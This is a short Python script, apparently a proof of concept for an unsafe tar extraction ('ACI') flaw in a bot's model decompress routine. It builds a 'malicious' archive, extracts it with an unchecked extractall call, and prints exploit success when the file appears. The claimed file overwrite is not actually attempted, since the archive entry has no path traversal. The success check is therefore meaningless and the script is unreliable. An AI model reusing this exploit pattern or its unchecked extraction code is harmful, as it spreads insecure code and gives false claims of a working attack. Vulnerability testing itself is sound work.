import tarfile
import os

# Create a malicious tar file
with tarfile.open("malicious_model.tar.gz", "w:gz") as tar:
    # Add a file that should overwrite an existing file in the bot directory
    tar.add("existing_bot_file.txt", arcname="malicious_file.txt")

# Function to simulate the vulnerable decompress method
def simulate_decompress():
    with tarfile.open("malicious_model.tar.gz", "r:gz") as tar:
        tar.extractall(path="bot_directory")

# Attempt to exploit
try:
    simulate_decompress()
    if "malicious_file.txt" in os.listdir("bot_directory"):
        print("The ACI exploit success!!!")
    else:
        print("The ACI exploit failed!!!")
except Exception as e:
    print("The ACI exploit failed!!!")
    print(str(e))
